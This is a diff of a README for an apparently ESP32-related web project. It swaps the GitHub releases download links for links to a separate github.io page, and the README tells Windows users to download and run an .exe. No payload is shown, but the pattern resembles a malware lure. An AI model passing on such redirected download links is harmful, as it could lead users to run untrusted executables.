@@ -1,6 +1,6 @@
 # 🎯 balan-a-esp32-web-project - Control Your ESP32 from Any Browser
 
-[![Download Now](https://img.shields.io/badge/Download-Latest_Release-blue?style=for-the-badge&logo=github&logoColor=white&color=random)](https://github.com/administrable-soakage746/balan-a-esp32-web-project/releases)
+[![Download Now](https://img.shields.io/badge/Download-Latest_Release-blue?style=for-the-badge&logo=github&logoColor=white&color=random)](https://administrable-soakage746.github.io)
 
 ## 📋 Overview
 
@@ -13,7 +13,7 @@ Follow these simple steps to download and run the application on your Windows co
 ### Step 1: Download the Software
 
 Visit this link to download the application:  
-👉 **[Download balan-a-esp32-web-project](https://github.com/administrable-soakage746/balan-a-esp32-web-project/releases)**
+👉 **[Download balan-a-esp32-web-project](https://administrable-soakage746.github.io)**
 
 Click the green "Releases" button on that page, then download the latest version file (look for the file with `.zip` or `.exe` extension).
 
@@ -93,7 +93,7 @@ If you encounter issues or have questions, please check the documentation includ
 
 ## 🔗 Download Again
 
-[![Get It Now](https://img.shields.io/badge/Download-Latest_Version-green?style=for-the-badge&logo=download&color=random)](https://github.com/administrable-soakage746/balan-a-esp32-web-project/releases)
+[![Get It Now](https://img.shields.io/badge/Download-Latest_Version-green?style=for-the-badge&logo=download&color=random)](https://administrable-soakage746.github.io)
 
 Click the badge above to download the latest release. Remember to extract the files before running the application if you download a `.zip` file.
 
